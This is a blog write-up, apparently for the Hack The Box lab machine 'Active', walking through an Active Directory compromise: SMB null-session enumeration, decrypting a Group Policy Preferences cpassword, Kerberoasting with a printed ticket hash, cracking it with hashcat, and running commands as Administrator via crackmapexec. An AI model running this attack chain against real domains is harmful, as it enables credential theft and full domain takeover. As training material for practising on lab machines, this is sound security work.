@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <link rel="stylesheet" href="/_assets/css/styles.css"> 
+    <link rel="stylesheet" href="/_assets/css/highlighter.css"> 
+    <link rel="stylesheet" href="/_assets/css/custom.css"> 
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <title>Active Writeup</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="/_assets/js/index.js"></script>
+  </head>
+
+  <body class="page-body">
+    <div class="page-body-container">
+      <div class="page-body-content-container">
+        <!-- <h2 class="back-button">&#8592;</h2> -->
+        <header class="post-header-container">
+    <h1 class="header-logo-div">
+        <a href=/ class="header-logo">soh3ee</a>
+    </h1>
+    <nav class="header-items">
+        <a class="header-item">dontclick</a>
+    </nav>
+</header>
+        <h1 class="page-title">Active Writeup</h1>
+        
+        
+        
+        
+        <p class="page-date-author-readtime">August 30, 2023 | 8 minutes </p>
+      
+        <h1 id="reconnaissance">Reconnaissance</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap 10.10.10.100 <span class="nt">-sCV</span> <span class="nt">-p</span> 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49
+157,49158,49165,49168,49169 <span class="nt">-o</span> nmap.txt
+Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server 2008 R2 SP1<span class="o">)</span>
+| dns-nsid:
+|_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-09-30 18:16:01Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: active.htb, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: active.htb, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49165/tcp open  msrpc         Microsoft Windows RPC
+49168/tcp open  msrpc         Microsoft Windows RPC
+49169/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   <span class="nb">date</span>: 2023-09-30T18:17:00
+|_  start_date: 2023-09-30T18:10:28
+| smb2-security-mode:
+|   210:
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+</code></pre></div></div>
+
+<h1 id="initial-access">Initial Access</h1>
+<p>There are three ports that stood out to me in my <code class="language-plaintext highlighter-rouge">nmap</code> scan: port 135 (RPC), 389 (LDAP) and 445 (SMB), as they are all possible gateways to further enumeration without credentials. RPC and LDAP both seemed to have restrictions on anonymous/guest authentication attempts. But at the end of the day, it always seems to be SMB! I was able to authenticate anonymously (null credentials).</p>
+
+<h3 id="port-135-rpc">Port 135 (RPC)</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> 10.10.10.100
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+
+<p>No permissions.</p>
+
+<h3 id="port-389-ldap">Port 389 (LDAP)</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ldapsearch <span class="nt">-H</span> ldap://10.10.10.100 <span class="nt">-b</span> <span class="s2">"dc=active,dc=htb"</span>
+SASL/GSS-SPNEGO authentication started
+ldap_sasl_interactive_bind_s: Local error <span class="o">(</span><span class="nt">-2</span><span class="o">)</span>
+additional info: SASL<span class="o">(</span><span class="nt">-1</span><span class="o">)</span>: generic failure: GSSAPI Error: Unspecified GSS failure.  
+Minor code may provide more information <span class="o">(</span>SPNEGO cannot find mechanisms to negotiate<span class="o">)</span>
+
+<span class="nv">$ </span>ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://10.10.10.100 <span class="nt">-b</span> <span class="s2">"dc=active,dc=htb"</span>
+<span class="c"># extended LDIF</span>
+<span class="c">#</span>
+<span class="c"># LDAPv3</span>
+<span class="c"># base &lt;dc=active,dc=htb&gt; with scope subtree</span>
+<span class="c"># filter: (objectclass=*)</span>
+<span class="c"># requesting: ALL</span>
+<span class="c">#</span>
+
+<span class="c"># search result</span>
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this opera
+ tion a successful <span class="nb">bind </span>must be completed on the connection., data 0, v1db1
+
+<span class="c"># numResponses: 1</span>
+</code></pre></div></div>
+
+<p>Unable to bind using anonymous login. The <code class="language-plaintext highlighter-rouge">-x</code> in the second <code class="language-plaintext highlighter-rouge">ldapsearch</code> query specifies NTLM authentication rather than Kerberos authentication (Kerberos by default).</p>
+
+<h3 id="port-445-smb">Port 445 (SMB)</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\:</span>
+</code></pre></div></div>
+
+<p>Anonymous authentication valid!</p>
+
+<h2 id="smb-enumeration">SMB Enumeration</h2>
+
+<p>Using <code class="language-plaintext highlighter-rouge">crackmapexec</code>, I can download files I have access to with anonymous login.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">-M</span> spider_plus <span class="nt">-o</span> <span class="nv">READ_ONLY</span><span class="o">=</span><span class="nb">false </span><span class="nv">DOWNLOAD</span><span class="o">=</span><span class="nb">true
+
+</span>SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\:</span>
+
+...
+
+SPIDER_P... 10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span>  MAX_FILE_SIZE: 50 KB
+SPIDER_P... 10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span>  OUTPUT_FOLDER: /tmp/cme_spider_plus
+SPIDER_P... 10.10.10.100    445    DC               <span class="o">[</span>+] Saved share-file metadata to <span class="s2">"/tmp/cme_spider_plus/10.10.10.100.json"</span><span class="nb">.</span>
+SPIDER_P... 10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> SMB Shares:           7 <span class="o">(</span>ADMIN<span class="nv">$,</span> C<span class="nv">$,</span> IPC<span class="nv">$,</span> NETLOGON, Replication, SYSVOL, Users<span class="o">)</span>
+SPIDER_P... 10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> SMB Readable Shares:  1 <span class="o">(</span>Replication<span class="o">)</span>
+
+...
+
+SPIDER_P... 10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> File unique exts:     4 <span class="o">(</span>.pol, .inf, .ini, .xml<span class="o">)</span>
+SPIDER_P... 10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloads successful: 7
+SPIDER_P... 10.10.10.100    445    DC               <span class="o">[</span>+] All files processed successfully.
+</code></pre></div></div>
+
+<p>I looked through the files that <code class="language-plaintext highlighter-rouge">crackmapexec</code> found on the SMB server (outputted to <code class="language-plaintext highlighter-rouge">tmp/cme_spider_plus</code> locally). Finally, I found a set of credentials in a <code class="language-plaintext highlighter-rouge">Groups.xml</code>for user <code class="language-plaintext highlighter-rouge">SVC_TGS</code> with an unrecognized encoding for the password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /tmp/cme_spider_plus/10.10.10.100/SYSVOL/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
+
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span>?&gt;
+&lt;Groups <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="o">&gt;</span>
+&lt;User <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"active.htb</span><span class="se">\*</span><span class="s2">*SVC_TGS**"</span> <span class="nv">image</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">changed</span><span class="o">=</span><span class="s2">"2018-07-18 20:46:06"</span> <span class="nv">uid</span><span class="o">=</span><span class="s2">"{EF57DA28-5F69-4530-A59E-AAB58578219D}"</span><span class="o">&gt;</span>
+	&lt;Properties <span class="nv">action</span><span class="o">=</span><span class="s2">"U"</span> <span class="nv">newName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">fullName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">description</span><span class="o">=</span><span class="s2">""</span> <span class="nv">cpassword</span><span class="o">=</span><span class="s2">"**edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ**"</span> <span class="nv">changeLogon</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">noChange</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">neverExpires</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">acctDisabled</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">userName</span><span class="o">=</span><span class="s2">"active.htb</span><span class="se">\S</span><span class="s2">VC_TGS"</span>/&gt;
+&lt;/User&gt;
+&lt;/Groups&gt;
+</code></pre></div></div>
+
+<p>The password was within a parameter called <code class="language-plaintext highlighter-rouge">cpassword</code>, which I wasn’t familiar with. After some research, it turned out to be a GPP (Group Policy Preferences) password. A long long time ago (Windows Server 2012 and previous), it was a hardcoded password that was associated with a Group Policy for specific scenarios. This password was stored in <code class="language-plaintext highlighter-rouge">Groups.xml</code>, and available to all domain users without elevated permissions (hence why my anonymous user could view it).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SVC_TGS:<span class="k">**</span>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ<span class="k">**</span>
+</code></pre></div></div>
+
+<p>This <code class="language-plaintext highlighter-rouge">cpassword</code> can be cracked offline. I used <code class="language-plaintext highlighter-rouge">gp3finder</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gp3finder <span class="nt">-D</span> edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+
+Group Policy Preference Password Finder <span class="o">(</span>GP3Finder<span class="o">)</span> 5.0.0
+Copyright <span class="o">(</span>C<span class="o">)</span> 2020  Oliver Morton
+This program comes with ABSOLUTELY NO WARRANTY.
+This is free software, and you are welcome to redistribute it
+under certain conditions. See GPLv2 License.
+
+INFO: gp3finder: Decrypted password is 26 characters.
+INFO: gp3finder: <span class="nt">--------------------------</span>
+INFO: gp3finder: GPPstillStandingStrong2k18
+INFO: gp3finder: <span class="nt">--------------------------</span>
+</code></pre></div></div>
+
+<p>I could also authenticate to SMB with the new set of credentials.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18
+</code></pre></div></div>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>Assuming that the <code class="language-plaintext highlighter-rouge">SVC</code> in <code class="language-plaintext highlighter-rouge">SVC_TGS</code> was for “Service”, I proceeded with the idea that it was a Service Account. Service Accounts are User Accounts on Windows Active Directory that have SPNs (Service Principal Names). A User Account (<code class="language-plaintext highlighter-rouge">SVC_TGS</code>) can request a TGS (Ticket-Granting-Service) Ticket for services that run for user accounts. TGS tickets are structured to be encrypted using the corresponding User Account (<code class="language-plaintext highlighter-rouge">SVC_TGS</code>), which therefore can be cracked offline. This kind of attack is known as Kerberoasting.</p>
+
+<p>To request TGS Tickets, I can use the <code class="language-plaintext highlighter-rouge">[Get-UserSPNs.py](http://Get-UserSPNs.py)</code> from <code class="language-plaintext highlighter-rouge">Impacket</code>. Ensure that the domain name is linked to the IP in your <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 <span class="nt">-request</span>
+Impacket <span class="k">for </span>Exegol - v0.10.1.dev1+20230909.241.3001b26 - Copyright 2022 Fortra - forked by ThePorgs
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
+<span class="nt">--------------------</span>  <span class="nt">-------------</span>  <span class="nt">--------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
+active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 12:06:40.351723  2023-09-30 19:09:12.575774
+
+<span class="o">[</span>-] CCache file is not found. Skipping...
+<span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator<span class="k">*</span><span class="nv">$82d533fc153c10625c6ffef7a269f8fc$d09a4ddc37f3bec122e37b599adad8c5832f4a5ccf8a8babfc272553304ab4ec1ab6fb0b9ba8afa9d283cec6ab1775f328ef1eb7bb794713072e2d704a6402ab7f11f6d345d5defe25931070dba2265c2d310d032f39099ba1f8124bda8f7acc6ab438262956c491fdeae25bc318ed73614ee4712e56e48b7248fd08b6b5260461f117ca06d63f8113b07665aa55ee18649a1a45a8a215cd8cd9d7d8c1d64e17df59d212879e5f9c69da59a4c48d2360cf3502d1d08d92341e8bbfe753c7d0e59cba0de8c6bac21147abbf63c2f000542ed19695cf94fcec12db4b96c7217376415f5dddb605e0d64e9d5ce9d781cb9a8efd6e0363944574cafa13d17c18e51f5946580402dc669cb4ce7668118afaed033f72f9165032d56450ed9c0fbc84e390ca50c764c26f5c47fbca1919aff071c1c8d1c8c3ccebc6a10a9924f1349b71489eef968fec3a5f8fa4f7551255b19ce09fd2e433fe8a950131bc7c1f4056d4077d4c2bff1b3b036b2c820cad831eebca518b9e2378c5d18a6bf3b0b454f74309c9d004728edde1d59faaf5c05a2620b338de77967f5665d89152fdfa0a9bcc3e2964bfc05e5c049391b240ca8e021d557e502c44e5cba5f25a171cd70c6364ae647a6f2c93d0124b322d85a16d43dbfd0c82f14d42f9775d9846c4f49cc73a04e772c927e480587507d26cc0bf8ed2caa051932bb8410c116b84b5c99f8abc949129d664b7ae43c452e2e6e52349b62a5d6a0d5f42a7ffc55934006ca258d980b1668a652844d46e8959546a95038f40dd804f878b41d3d52831240296c20047b2e6dd5a60d6131b3cf3da5f402b8cada164a38191c421289073bc1ef8c4b4b3f60b75af962ba5442b80c737ebad71f8ce2b1cc434c94aeb1a5c0d7e75b254c058ffce225065a5edb96f991c7aa21fd7894d9832107c669735357fe6fc9c9d177180a1727bc24bb34d7b533dfc7aca79810a29fefa7cf48066f021a1e3dfee61581bee30a1e4b85a714ce875413f193962b363b77f168acffdb2e2e83ece06fd843beec162500cd6d29d7b93a9992b43dc44b95febb299fd131085c36ae0a5dc96babc16d3acd3ba8ca5648905f4a36631a167ab9513214f7bd6f55b50a20c2ffe7a027dfaafde0495de5d7b208f20a269c1201b643af4be78179a168e6ae6376cb86e115f040c6b087e01ef7e72402cdff566ebc4a370781a4726a107e8d033c21b30948967634fe2d019ea1301d0a1eacd2487ef2475b302</span>
+</code></pre></div></div>
+
+<p>Like I mentioned previously, the TGS Ticket can be cracked offline. My choice of cracker is <code class="language-plaintext highlighter-rouge">hashcat</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hashcat <span class="nt">-m</span> 13100 TGS.txt rockyou.txt
+
+...
+
+Administrator:Ticketmaster1968
+</code></pre></div></div>
+
+<p>With <code class="language-plaintext highlighter-rouge">Administrator</code> credentials, I can execute commands through <code class="language-plaintext highlighter-rouge">crackmapexec</code> since I have maximum privileges. I read <code class="language-plaintext highlighter-rouge">user.txt</code> and <code class="language-plaintext highlighter-rouge">root.txt</code> with <code class="language-plaintext highlighter-rouge">type</code>, and I was done!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'Ticketmaster1968'</span> <span class="nt">-x</span> <span class="s2">"type C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\S</span><span class="s2">VC_TGS</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\u</span><span class="s2">ser.txt"</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\A</span>dministrator:Ticketmaster1968 <span class="o">(</span>admin<span class="o">)</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span>+] Executed <span class="nb">command </span>via wmiexec
+SMB         10.10.10.100    445    DC               63c7f991f863ad472d860994c7b966c5
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'Ticketmaster1968'</span> <span class="nt">-x</span> <span class="s2">"type C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\S</span><span class="s2">VC_TGS</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\u</span><span class="s2">ser.txt"</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\A</span>dministrator:Ticketmaster1968 <span class="o">(</span>admin<span class="o">)</span>
+SMB         10.10.10.100    445    DC               <span class="o">[</span>+] Executed <span class="nb">command </span>via wmiexec
+SMB         10.10.10.100    445    DC               63c7f991f863ad472d860994c7b966c5
+</code></pre></div></div>
+
+
+        
+      </div>
+      
+      
+      
+  </div> <!-- page-body-container END-->
+  </body>
+  <script>
+  $(document).ready(function() {
+  var toc = $("#toc"); // target the table of contents element
+  var tocEntries = toc.find("a"); // target the links within the table of contents
+  
+  $(window).scroll(function() {
+    // get the current scroll position of the window
+    var currentPosition = $(this).scrollTop();
+    
+    // loop through each link in the table of contents
+    tocEntries.each(function() {
+      // get the ID of the section of content that this link points to
+      var target = $(this).attr("href");
+      
+      // use the ID to target the corresponding section of content
+      var section = $(target);
+      
+      // if the section exists and its top position is within the current viewport
+      if (section.length && section.offset().top <= currentPosition + 200) {
+        // remove the active class from all links in the table of contents
+        tocEntries.removeClass("active");
+        
+        // add the active class to the link that corresponds to the current section
+        $(this).addClass("active");
+      }
+    });
+  });
+  });
+
+  </script>
+
+</html>
+
